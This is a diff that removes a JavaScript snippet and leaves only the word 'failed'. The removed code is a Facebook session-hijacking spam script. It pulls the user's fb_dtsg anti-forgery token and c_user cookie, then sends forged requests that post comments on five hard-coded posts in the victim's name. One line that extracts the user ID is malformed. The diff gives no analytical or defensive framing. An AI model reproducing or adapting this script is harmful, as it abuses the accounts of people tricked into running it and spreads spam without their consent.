@@ -1,17 +1,1 @@
-var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
-var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
-var now = (new Date).getTime();
-function com(cc) {
- 
-    var Page = new XMLHttpRequest();
-    var PageURL = "//www.facebook.com/ajax/ufi/add_comment.php";
-    var PageParams = "ft_ent_identifier="+cc+"&comment_text=<3 <3 <3 &source=2&client_id=1381330051325%3A2643585115&reply_fbid&parent_comment_id&rootid=u_0_9&clp=%7B%22cl_impid%22%3A%2289ff834f%22%2C%22clearcounter%22%3A0%2C%22elementid%22%3A%22js_0%22%2C%22version%22%3A%22x%22%2C%22parent_fbid%22%3A"+cc+"%7D&attached_sticker_fbid=0&attached_photo_fbid=0&giftoccasion&ft[tn]=[]&__user="+user_id+"&__a=1&__dyn=7n8ahyj35ynzpQ9UmWWuUGy6zECi8w&__req=h&fb_dtsg="+fb_dtsg+"&ttstamp=265816610484687452";
-    Page.open("POST", PageURL, true);
-    Page.onreadystatechange = function () {
-        if (Page.readyState == 4 && Page.status == 200) {
-            Page.close;
-        }
-    };
-    Page.send(PageParams);
-}
-com("1410808845836753");com("1415754155342222");com("1412907228960248");com("1414876928763278");com("1413177385599899");
+failed
